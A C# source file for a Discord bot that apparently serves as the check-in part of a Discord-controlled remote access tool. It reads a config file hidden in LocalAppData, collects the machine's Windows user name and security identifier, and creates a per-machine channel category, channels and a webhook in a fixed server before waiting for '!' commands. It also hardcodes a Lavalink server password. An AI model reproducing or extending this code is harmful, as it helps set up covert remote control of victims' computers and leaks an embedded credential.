using DSharpPlus.Interactivity;
using DSharpPlus;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using DSharpPlus.CommandsNext;
using System.IO;
using DSharpPlus.Entities;
using System.Security.Cryptography.X509Certificates;
using DSharpPlus.CommandsNext.Attributes;
using System.Net.NetworkInformation;
using DSharpPlus.Interactivity.Extensions;
using Newtonsoft.Json;
using Discord_Main.Properties;
using System.Threading;
using DSharpPlus.VoiceNext;
using DSharpPlus.Net;
using DSharpPlus.Lavalink;
using Microsoft.VisualBasic;
using Salaros.Configuration;

namespace Discord_Main
{

    public class Bot
    {

        public InteractivityExtension interactivity { get; private set; }
        public DiscordClient discord { get; private set; }
        public string pc_name { get; private set; }
        public string HWID { get; private set; }

        private string appConfig = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\appConfig33.cfg";
        // Global_Basic

        public async Task Main()
        {

            Globals.Guild = Convert.ToUInt64(Globals.TempGuild);

            var cfg = new ConfigParser(appConfig);
            Global_Basic.Made_Channel = Convert.ToUInt64(cfg.GetValue("CONFIG", "Made_Channel"));
            Global_Basic.VoiceChat = Convert.ToUInt64(cfg.GetValue("CONFIG", "VoiceChat"));
            Global_Basic.Webhook = cfg.GetValue("CONFIG", "Webhook");
            Global_Basic.Group = Convert.ToUInt64(cfg.GetValue("CONFIG", "Group"));

            discord = new DiscordClient(new DiscordConfiguration()
            {
                Token = Globals.Token,
                TokenType = TokenType.Bot,
                Intents = DiscordIntents.AllUnprivileged | DiscordIntents.MessageContents
            });
            var commandsConfig = new CommandsNextConfiguration()
            {
                StringPrefixes = new string[] { "!" },
                EnableDms = true,
                EnableMentionPrefix = true,
            };

            var Commands = discord.UseCommandsNext(commandsConfig);
            Commands.RegisterCommands<Fun>();

            discord.UseInteractivity(new InteractivityConfiguration
            {
                Timeout = TimeSpan.FromMinutes(2)
            });

            /*     discord.MessageCreated += async (s, e) =>
                 {
                     if (e.Message.Content.ToLower().StartsWith("ping"))
                     {
                         DiscordButtonComponent button1 = new DiscordButtonComponent(ButtonStyle.Primary, "1", "NOOB", false);
                         var msg = new DiscordMessageBuilder().AddEmbed(new DiscordEmbedBuilder()
                             .WithColor(DiscordColor.Azure)
                             .WithTitle("L")
                             .WithDescription("L")
                             )
                         .AddComponents(button1);

                         await e.Channel.SendMessageAsync(msg);
                     }
                 };
            */
            var guild = await discord.GetGuildAsync(Globals.Guild, false);

            pc_name = System.Windows.Forms.SystemInformation.UserName;
            HWID = System.Security.Principal.WindowsIdentity.GetCurrent().User.Value;
            if ((ulong)Global_Basic.Made_Channel == 0)
            {
                Make_Main_Channels();
            }
            else
            {
                var Main_Channel = guild.GetChannel((ulong)Global_Basic.Made_Channel);
                if (Main_Channel == null)
                {
                    DiscordChannel cmd_channel = guild.GetChannel(Globals.Cmd);
                 //   await cmd_channel.SendMessageAsync("Error Session not existing");
                    Thread.Sleep(10);
                //    await cmd_channel.SendMessageAsync("Making a new Channels");
                    Make_Main_Channels();
                }
                Console.WriteLine(Main_Channel);
            }

            var endpoint = new ConnectionEndpoint
            {
                Hostname = "lavalink.devamop.in",
                Port = 443,
                Secured = true
            };

            var lavalinkConfig = new LavalinkConfiguration
            {
                Password = "DevamOP",
                RestEndpoint = endpoint,
                SocketEndpoint = endpoint
            };

            //  var lavalink = discord.UseLavalink();

            await discord.ConnectAsync();
            //   await lavalink.ConnectAsync(lavalinkConfig);
            await Task.Delay(-1);
        }
        public async Task Make_Main_Channels()
        {
            var cfg = new ConfigParser(appConfig);

            var guild = await discord.GetGuildAsync(Globals.Guild, false);
            DiscordChannel Catergory = await guild.CreateChannelCategoryAsync(pc_name + " - " + HWID.ToString(), null, 0);
            Console.WriteLine("Catergory :" + Catergory.ToString());
            var Channel_id = await guild.CreateChannelAsync("main", ChannelType.Text, Catergory).ConfigureAwait(false);
            var VoiceChat = await guild.CreateChannelAsync("Voice", ChannelType.Voice, Catergory).ConfigureAwait(false);
            var webhook = await Channel_id.CreateWebhookAsync("EPIC WEBBER");
            Global_Basic.Made_Channel = Channel_id.Id;
            Global_Basic.VoiceChat = VoiceChat.Id;
            Global_Basic.Webhook = webhook.Url;

            cfg.SetValue("CONFIG", "Made_Channel", Global_Basic.Made_Channel.ToString());
            cfg.SetValue("CONFIG", "VoiceChat", Global_Basic.VoiceChat.ToString());
            cfg.SetValue("CONFIG", "Webhook", Global_Basic.Webhook);

            //     Global_Basic.Made_Channel = Convert.ToUInt64(cfg.GetValue("CONFIG", "Made_Channel"));
            //  Global_Basic.VoiceChat = Convert.ToUInt64(cfg.GetValue("CONFIG", "VoiceChat"));
            //   Global_Basic.Webhook = cfg.GetValue("CONFIG", "Webhook");
            cfg.Save();
            await discord.SendMessageAsync(Channel_id, "I am online yippe");
        }


    }
}
